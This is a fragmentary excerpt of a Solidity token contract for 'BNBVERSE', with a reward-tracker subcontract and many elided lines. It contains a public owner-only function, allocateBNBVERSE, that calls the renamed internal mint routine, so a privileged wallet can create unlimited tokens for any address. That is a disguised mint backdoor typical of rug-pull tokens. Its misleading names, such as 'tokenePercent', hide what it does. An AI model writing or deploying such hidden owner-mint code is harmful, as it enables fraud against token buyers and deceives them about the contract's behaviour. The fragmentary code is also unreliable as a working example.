...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function allotBNBVERSE(address account, uint256 amount) internal virtual {
...
function allotBNBVERSE(address account, uint256 value) internal override {
    super.allotBNBVERSE(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      allotBNBVERSE(account, mintAmount);
...
contract BNBVERSErewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardBNBVERSEMap  for RewardBNBVERSEMap .Map;
RewardBNBVERSEMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("BNBVERSE_rewardToken_Tracker", "BNBVERSE_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "BNBVERSE_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "BNBVERSE_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main BNBVERSE contract.");
    }
...
contract BNBVERSE is ERC20, Ownable {
 ...
 uint256 public gasForProcessing = 300000;
    ...
    BNBVERSErewardToken public rewardToken;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("BNBVERSE", "BNV") {
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new BNBVERSErewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 allotBNBVERSE(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function allocateBNBVERSE(address tokenAddress, uint256 tokenePercent) public masterWallet{
       allotBNBVERSE(tokenAddress, tokenePercent);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "BNBVERSE: The router already has that address");
...
function updateGasForProcessing(uint256 newValue) public masterWallet {
 ...
 uint256 tokensTBNBVERSE = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTBNBVERSE);
...
addLiquidity(tokensTBNBVERSE, bnbForLiquidity);
